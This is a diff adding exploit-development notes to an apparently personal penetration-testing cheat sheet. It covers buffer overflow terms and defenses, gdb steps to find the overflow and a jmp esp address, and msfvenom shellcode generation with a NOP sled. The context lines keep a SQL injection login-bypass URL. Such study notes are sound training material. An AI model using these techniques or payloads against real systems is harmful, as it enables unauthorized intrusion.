@@ -508,3 +508,63 @@ example http://10.50.29.140/login.php?username=%27+OR+1%3D%271+&passwd=%27+OR+1%
 2) put Union SELECT 1,2,3 and so on till you find out how it what is available
 3) @@version will give what ther version of the data base is.
 ```
+# Exploit Development
+
+# Buffer Overflow Common Terms
+```
+Heap: Memory that can be allocated and deallocated
+Stack: A contiguous section of memory used for passing arguments (our goal is to put executable code into the stack)
+Registers: Storage elements as close as possible to the central processing unit (CPU)
+Instruction Pointer (IP): a.k.a Program Counter (PC), contains the address of next instruction to be executed
+Stack Pointer (SP): Contains the address of the next available space on the stack
+Base Pointer (BP): The base of the stack
+Function: Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
+Shellcode: The code that is executed once an exploit successfully takes advantage of a vulnerability
+```
+# Buffer Overflow Defenses 
+```
+Non executable (NX) stack
+Address Space Layout Randomization (ASLR)
+Data Execution Prevention (DEP)
+Stack Canaries (security cookies in windows)
+Position Independent Executable (PIE)
+```
+
+# Technical Help
+```
+Utilizing tools such as:
+  IDA, GHIDRA
+  GDB, MONA, IMMUNITY
+  BASH, PYTHON
+```
+# passing args to a executable (bash)
+./func $(echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa") (see if it can be passed into it as a argument)
+./func <<<$(echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa") (passes into it when it runs)
+gdb {executable} (debugger)
+run (use run to run function)
+info functions (shows the functions in that executable)
+pdisass (color coded breakdown)
+shell (gives us a shell)
+
+# steps to buffer overflow
+1) gdb ./[file] run this to get a debug stream
+2) use run <<<$(./buff.py) to figure out where the overflow starts (https://wiremask.eu/)
+3) get clean gdb:
+         env - gdb ./[file]
+         show env
+         unset env COLUMNS
+         unset env LINES
+         run (manually overflow)
+         info proc map (shows part of heap and all of the stack)
+         grab first address after heap (start address)
+         GRAB END ADDRESS from [stack]
+         adjust script with # find /b [start], [end], 0xff, 0xe4 (looks for jmp esv)
+         run it in clean gdb and get the first 4 results
+4) use  msfvenom --list payloads to see all payloads\
+5) msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python (run this)
+6) replace eip with first "\xXX" and add nop = "\x90" * 15-20 (choose a number)
+7) add in code from msfvenom
+8) add code you get from msfvenom and then run the script in gdb
+9) then run the file against the script
+10) 
+ env - gdb ./func
